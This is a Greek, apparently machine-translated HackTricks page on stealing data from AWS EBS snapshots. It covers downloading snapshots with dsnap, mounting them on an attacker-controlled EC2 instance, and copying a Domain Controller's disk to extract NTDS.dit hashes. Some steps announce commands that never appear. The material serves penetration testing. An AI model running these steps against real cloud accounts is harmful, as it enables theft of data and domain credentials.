# AWS - Αντιγραφή Ασφαλείας EBS

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον επαγγελματία με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

### Έλεγχος μιας αντιγραφής ασφαλείας τοπικά
```bash
# Install dependencies
pip install 'dsnap[cli]'
brew install vagrant
brew install virtualbox

# Get snapshot from image
mkdir snap_wordir; cd snap_workdir
dsnap init
## Download a snapshot of the volume of that instance
## If no snapshot existed it will try to create one
dsnap get <instance-id>
dsnap --profile default --region eu-west-1 get i-0d706e33814c1ef9a
## Other way to get a snapshot
dsnap list #List snapshots
dsnap get snap-0dbb0347f47e38b96 #Download snapshot directly

# Run with vagrant
IMAGE="<download_file>.img" vagrant up #Run image with vagrant+virtuabox
IMAGE="<download_file>.img" vagrant ssh #Access the VM
vagrant destroy #To destoy

# Run with docker
git clone https://github.com/RhinoSecurityLabs/dsnap.git
cd dsnap
make docker/build
IMAGE="<download_file>.img" make docker/run #With the snapshot downloaded
```
Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, ανατρέξτε στην αρχική έρευνα στο [https://rhinosecuritylabs.com/aws/exploring-aws-ebs-snapshots/](https://rhinosecuritylabs.com/aws/exploring-aws-ebs-snapshots/)

Μπορείτε να το κάνετε αυτό με το Pacu χρησιμοποιώντας το αρθρωτό [ebs\_\_download\_snapshots](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#ebs\_\_download\_snapshots)

### Έλεγχος ενός snapshot στο AWS

{% code overflow="wrap" %}
```bash
aws ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id snap-0b49342abd1bdcb89
```
{% endcode %}

**Τοποθετήστε το σε ένα EC2 VM υπό τον έλεγχό σας** (πρέπει να είναι στην ίδια περιοχή με το αντίγραφο του αντιγράφου ασφαλείας):

Βήμα 1: Δημιουργήστε έναν νέο τόμο του προτιμώμενου μεγέθους και τύπου μεταβαίνοντας στο EC2 -> Τόμοι.

Για να εκτελέσετε αυτήν την ενέργεια, ακολουθήστε αυτές τις εντολές:
- Δημιουργήστε έναν τόμο EBS για να συνδεθεί με την παράσταση EC2.
- Βεβαιωθείτε ότι ο τόμος EBS και η παράσταση βρίσκονται στην ίδια ζώνη.

Βήμα 2: Επιλέξτε την επιλογή "σύνδεση τόμου" κάνοντας δεξί κλικ στον δημιουργημένο τόμο.

Βήμα 3: Επιλέξτε την παράσταση από το πλαίσιο κειμένου παράστασης.

Για να εκτελέσετε αυτήν την ενέργεια, χρησιμοποιήστε την ακόλουθη εντολή:
- Συνδέστε τον τόμο EBS.

Βήμα 4: Συνδεθείτε στην παράσταση EC2 και εμφανίστε τους διαθέσιμους δίσκους χρησιμοποιώντας την εντολή `lsblk`.

Βήμα 5: Ελέγξτε εάν ο τόμος έχει οποιαδήποτε δεδομένα χρησιμοποιώντας την εντολή `sudo file -s /dev/xvdf`.

Εάν η έξοδος της παραπάνω εντολής εμφανίζει "/dev/xvdf: data", σημαίνει ότι ο τόμος είναι άδειος.

Βήμα 6: Μορφοποιήστε τον τόμο στο σύστημα αρχείων ext4 χρησιμοποιώντας την εντολή `sudo mkfs -t ext4 /dev/xvdf`. Εναλλακτικά, μπορείτε επίσης να χρησιμοποιήσετε τη μορφή xfs χρησιμοποιώντας την εντολή `sudo mkfs -t xfs /dev/xvdf`. Παρακαλούμε να σημειώσετε ότι πρέπει να χρησιμοποιήσετε είτε ext4 είτε xfs.

Βήμα 7: Δημιουργήστε έναν κατάλογο της επιλογής σας για να τοποθετήσετε τον νέο τόμο ext4. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το όνομα "newvolume".

Για να εκτελέσετε αυτήν την ενέργεια, χρησιμοποιήστε την εντολή `sudo mkdir /newvolume`.

Βήμα 8: Τοποθετήστε τον τόμο στον κατάλογο "newvolume" χρησιμοποιώντας την εντολή `sudo mount /dev/xvdf /newvolume/`.

Βήμα 9: Αλλάξτε κατάλογο στον κατάλογο "newvolume" και ελέγξτε τον χώρο δίσκου για να επικυρώσετε την τοποθέτηση του τόμου.

Για να εκτελέσετε αυτήν την ενέργεια, χρησιμοποιήστε τις ακόλουθες εντολές:
- Αλλάξτε κατάλογο σε `/newvolume`.
- Ελέγξτε τον χώρο δίσκου χρησιμοποιώντας την εντολή `df -h .`. Η έξοδος αυτής της εντολής θα πρέπει να εμφανίζει τον ελεύθερο χώρο στον κατάλογο "newvolume".

Μπορείτε να το κάνετε αυτό με το Pacu χρησιμοποιώντας τον ενότητα `ebs__explore_snapshots`.

### Έλεγχος ενός αντιγράφου ασφαλείας στο AWS (χρησιμοποιώντας το cli)

{% code overflow="wrap" %}
```bash
aws ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id <snap-0b49342abd1bdcb89>

# Attach new volume to instance
aws ec2 attach-volume --device /dev/sdh --instance-id <INSTANCE-ID> --volume-id <VOLUME-ID>

# mount the snapshot from within the VM

sudo file -s /dev/sdh
/dev/sdh: symbolic link to `xvdh'

sudo file -s /dev/xvdh
/dev/xvdh: x86 boot sector; partition 1: ID=0xee, starthead 0, startsector 1, 16777215 sectors, extended partition table (last)\011, code offset 0x63

lsblk /dev/xvdh
NAME     MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
xvdh     202:112  0    8G  0 disk
├─xvdh1  202:113  0  7.9G  0 part
├─xvdh14 202:126  0    4M  0 part
└─xvdh15 202:127  0  106M  0 part

sudo mount /dev/xvdh1 /mnt

ls /mnt
```
{% endcode %}

### Αντίγραφο Σκιάς

Οποιοσδήποτε χρήστης του AWS που διαθέτει την άδεια **`EC2:CreateSnapshot`** μπορεί να κλέψει τις κατακερματισμένες τιμές όλων των χρηστών του τομέα δημιουργώντας ένα **αντίγραφο σκιάς του Domain Controller**, τοποθετώντας το σε ένα instance που ελέγχουν και εξάγοντας το αρχείο NTDS.dit και το αρχείο καταχώρησης SYSTEM για χρήση με το εργαλείο secretsdump του Impacket.

Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να αυτοματοποιήσετε την επίθεση: [https://github.com/Static-Flow/CloudCopy](https://github.com/Static-Flow/CloudCopy) ή μπορείτε να χρησιμοποιήσετε μία από τις προηγούμενες τεχνικές μετά τη δημιουργία ενός αντιγράφου σκιάς.


# Αναφορές
* https://devopscube.com/mount-ebs-volume-ec2-instance/

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
